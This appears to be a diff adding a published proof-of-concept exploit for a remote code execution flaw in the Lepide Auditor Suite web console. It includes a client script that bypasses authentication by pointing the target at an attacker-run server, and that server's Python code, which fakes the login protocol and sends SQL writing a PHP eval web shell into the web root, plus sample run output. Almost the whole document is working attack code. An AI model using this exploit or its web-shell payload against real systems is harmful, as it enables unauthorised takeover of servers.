@@ -1,0 +1,195 @@
+#!/usr/bin/python
+"""
+Lepide Auditor Suite createdb() Web Console Database Injection Remote Code Execution Vulnerability
+Vendor:   http://www.lepide.com/
+File:     lepideauditorsuite.zip 
+SHA1:     3c003200408add04308c04e3e0ae03b7774e4120
+Download: http://www.lepide.com/lepideauditor/download.html
+Analysis: https://www.offensive-security.com/vulndev/auditing-the-auditor/
+
+Summary:
+========
+
+The application allows an attacker to specify a server where a custom protocol is implemented. This server performs the authentication and allows an attacker to execute controlled SQL directly against the database as root.
+
+Additional code:
+================
+
+When I wrote this poc, I didn't combine the server and client into a single poc. So below is the client-poc.py code:
+
+root@kali:~# cat client-poc.py
+#!/usr/bin/python
+import requests
+import sys
+
+if len(sys.argv) < 3:
+    print "(+) usage: %s <target> <attacker's server>" % sys.argv[0]
+    sys.exit(-1)
+
+target = sys.argv[1]
+server = sys.argv[2]
+
+s = requests.Session()
+print "(+) sending auth bypass"
+s.post('http://%s:7778/' % target, data = {'servername':server, 'username':'whateva','password':'thisisajoke!','submit':''}, allow_redirects=False)
+print "(+) sending code execution request"
+s.get('http://%s:7778/genratereports.php' % target, params = {'path':'lol','daterange':'2@3','id':'6'})
+
+Example:
+========
+
+root@kali:~# ./server-poc.py 
+Lepide Auditor Suite createdb() Web Console Database Injection Remote Code Execution
+by mr_me 2016
+
+(+) waiting for the target...
+(+) connected by ('172.16.175.174', 50541)
+(+) got a login request
+(+) got a username: test
+(+) got a password: hacked
+(+) sending SUCCESS packet
+(+) send string successful
+(+) connected by ('172.16.175.174', 50542)
+(+) got a login request
+(+) got a username: test
+(+) got a password: hacked
+(+) sending SUCCESS packet
+(+) send string successful
+(+) got a column request
+(+) got http request id: 6
+(+) got http request path: lol
+(+) send string successful
+(+) got a filename request
+(+) got http request daterange: 1@9 -  23:59:59
+(+) got http request id: 6
+(+) got http request path: lol
+(+) successfully sent tag
+(+) successfully sent file!
+(+) file sent successfully
+(+) done! Remote Code Execution: http://172.16.175.174:7778/offsec.php?e=phpinfo();
+
+In another console:
+
+root@kali:~# ./client-poc.py 172.16.175.174 172.16.175.1
+(+) sending auth bypass
+(+) sending code execution request
+"""
+import struct
+import socket
+from thread import start_new_thread
+import struct
+
+LOGIN    = 601
+COLUMN   = 604
+FILENAME = 603
+
+VALID = 2
+TAGR  = 4
+FILEN = 5
+SUCCESS = "_SUCCESS_"
+
+def get_string(conn):
+    size = struct.unpack(">i", conn.recv(4))[0] 
+    data = conn.recv(size).decode("utf-16")
+    conn.send(struct.pack(">i", VALID))
+    return data
+
+def send_string(conn, string):
+    size = len(string.encode("utf-16-le"))
+    conn.send(struct.pack(">i", size))
+    conn.send(string.encode("utf-16-le"))
+    return struct.unpack(">i", conn.recv(4))[0] 
+
+def send_tag(conn, tag):
+    conn.send(struct.pack(">i", TAGR))
+    conn.send(struct.pack(">i", tag))
+    return struct.unpack(">i", conn.recv(4))[0]
+
+def send_file(conn, filedata):
+    if send_tag(conn, FILEN) == 2:
+        print "(+) successfully sent tag"
+
+        # send length of file
+        conn.send(struct.pack(">i", len(filedata.encode("utf-16-le"))))
+
+        # send the malicious payload
+        conn.send(filedata.encode("utf-16-le"))
+        if struct.unpack(">i", conn.recv(4))[0] == 2:
+            print "(+) successfully sent file!"
+            if send_tag(conn, VALID) == 2:
+                return True
+    return False
+
+def client_thread(conn):
+    """
+    Let's put it this way, my mum's not proud of my code.
+    """
+    while True:
+        data = conn.recv(4)
+        if data:
+            resp = struct.unpack(">i", data)[0]
+            if resp == 4:
+                code = conn.recv(resp)
+                resp = struct.unpack(">i", code)[0]
+
+                # stage 1
+                if resp == LOGIN:
+                    print "(+) got a login request"
+
+                    # send a VALID response back
+                    conn.send(struct.pack(">i", VALID))
+
+                    # now we expect to get the username and password
+                    print "(+) got a username: %s" % get_string(conn)
+                    print "(+) got a password: %s" % get_string(conn)
+
+                    # now we try to send to send a success packet
+                    print "(+) sending SUCCESS packet"
+                    if send_string(conn, SUCCESS) == 2:
+                        print "(+) send string successful"
+
+                # stage 2
+                elif resp == COLUMN:
+                    print "(+) got a column request"
+
+                    # send a VALID response back
+                    conn.send(struct.pack(">i", VALID))
+                    print "(+) got http request id: %s" % get_string(conn)
+                    print "(+) got http request path: %s" % get_string(conn)
+                    if send_string(conn, "foo-bar") == 2:
+                        print "(+) send string successful"
+
+                # stage 3 - this is where the exploitation is
+                elif resp == FILENAME:
+                    print "(+) got a filename request"
+                    conn.send(struct.pack(">i", VALID))
+
+                    # now we read back 3 strings...
+                    print "(+) got http request daterange: %s" % get_string(conn)
+                    print "(+) got http request id: %s" % get_string(conn)
+                    print "(+) got http request path: %s" % get_string(conn)
+
+                    # exploit!
+                    if send_file(conn, "select '<?php eval($_GET[e]); ?>' into outfile '../../www/offsec.php';"):
+                        print "(+) file sent successfully"
+                        print "(+) done! Remote Code Execution: http://%s:7778/offsec.php?e=phpinfo();" % (addr[0])
+                        break
+    conn.close()
+
+HOST = '0.0.0.0'
+PORT = 1056
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.bind((HOST, PORT))
+s.listen(10)
+
+print "Lepide Auditor Suite createdb() Web Console Database Injection Remote Code Execution"
+print "by mr_me 2016\t\n"
+print "(+) waiting for the target..."
+while True:
+
+    # blocking call, waits to accept a connection
+    conn, addr = s.accept()
+    print '(+) connected by %s' % addr
+    start_new_thread(client_thread, (conn,))
+s.close()
